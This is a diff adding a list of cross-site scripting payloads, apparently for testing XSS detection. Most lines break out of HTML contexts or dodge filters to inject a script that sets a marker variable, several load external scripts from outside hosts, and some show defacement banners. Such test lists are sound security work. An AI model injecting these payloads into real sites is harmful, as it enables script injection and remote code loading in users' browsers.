@@ -1,0 +1,49 @@
+<script>var MySecretXssVariable = 'Hello World!';</script>
+</script><script>var MySecretXssVariable = 'Hello World!';</script>
+<SCRIPT "a='>'" SRC="https://mariaoskar.github.io/XSSTest/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="https://mariaoskar.github.io/XSSTest/xss.js"></SCRIPT>
+<SCRIPT a=">" SRC="https://mariaoskar.github.io/XSSTest/xss.js"></SCRIPT>
+</script><script>var MySecretXssVariable = 'Hello World!';</script>
+<SCRIPT>var a="\\";var MySecretXssVariable = 'Hello World!';//";</SCRIPT>
+<<SCRIPT>var MySecretXssVariable = 'Hello World!';//<</SCRIPT>
+<IMG """><SCRIPT>var MySecretXssVariable = 'Hello World!';</SCRIPT>">
+<? foo="><script>javascript:var MySecretXssVariable = 'Hello World!';</script>">
+<! foo="><script>javascript:var MySecretXssVariable = 'Hello World!';</script>">
+</ foo="><script>javascript:var MySecretXssVariable = 'Hello World!';</script>">
+<<SCRIPT>var MySecretXssVariable = 'Hello World!';//<</SCRIPT>
+</TITLE><SCRIPT>var MySecretXssVariable = 'Hello World!';</SCRIPT>
+<script /**/>/**/var MySecretXssVariable = 'Hello World!';/**/</script /**/
+ <script ^__^>var MySecretXssVariable = 'Hello World!';</script ^__^
+</style &#32;><script &#32; :-(>/**/var MySecretXssVariable = 'Hello World!';/**/</script &#32; :-(
+<script ~~~>var MySecretXssVariable = 'Hello World!';</script ~~~>
+<script src="data:text/javascript,var MySecretXssVariable = 'Hello World!';"></script>
+<script x> var MySecretXssVariable = 'Hello World!'; </script 1=2
+<script>var MySecretXssVariable = 'Hello World!';</script>
+<IMG """><SCRIPT>var MySecretXssVariable = 'Hello World!';</SCRIPT>">
+<script>var MySecretXssVariable = 'Hello World!';</script>
+<marquee><script>var MySecretXssVariable = 'Hello World!';</script></marquee>
+"><script>var MySecretXssVariable = 'Hello World!';</script>
+</title><script>var MySecretXssVariable = 'Hello World!';</script>
+</textarea><script>var MySecretXssVariable = 'Hello World!';</script>
+<script language="JavaScript">var MySecretXssVariable = 'Hello World!';</script>
+'">><script>var MySecretXssVariable = 'Hello World!';</script>
+</script><script>var MySecretXssVariable = 'Hello World!';</script>
+'"></title><script>var MySecretXssVariable = 'Hello World!';</script>
+</textarea>'"><script>var MySecretXssVariable = 'Hello World!';</script>
+'""><script language="JavaScript"> var MySecretXssVariable = 'Hello World!';</script>
+'></select><script>var MySecretXssVariable = 'Hello World!';</script>
+='><script>var MySecretXssVariable = 'Hello World!';</script>
+<body background=javascript:'"><script>var MySecretXssVariable = 'Hello World!';</script>></body>
+">/XaDoS/><script>var MySecretXssVariable = 'Hello World!';</script><script src="http://www.site.com/XSS.js"></script>
+">/KinG-InFeT.NeT/><script>var MySecretXssVariable = 'Hello World!';</script>
+!--" /><script>var MySecretXssVariable = 'Hello World!';</script>
+<script>var MySecretXssVariable = 'Hello World!';</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>var MySecretXssVariable = 'Hello World!';</script>><marquee><h1>XSS by xss</h1></marquee>
+'"></title><script>var MySecretXssVariable = 'Hello World!';</script>><marquee><h1>XSS by xss</h1></marquee>
+<img """><script>var MySecretXssVariable = 'Hello World!';</script><marquee><h1>XSS by xss</h1></marquee>
+<script>var MySecretXssVariable = 'Hello World!';</script><marquee><h1>XSS by xss</h1></marquee>
+"><script>var MySecretXssVariable = 'Hello World!';</script>"><script>alert("XSS by \nxss</h1></marquee>
+'"></title><script>var MySecretXssVariable = 'Hello World!';</script>><marquee><h1>XSS by xss</h1></marquee>
+'><SCRIPT>var MySecretXssVariable = 'Hello World!';</SCRIPT><img src="" alt='
+"><SCRIPT>var MySecretXssVariable = 'Hello World!';</SCRIPT><img src="" alt="
+\'><SCRIPT>var MySecretXssVariable = 'Hello World!';</SCRIPT><img src="" alt=\'
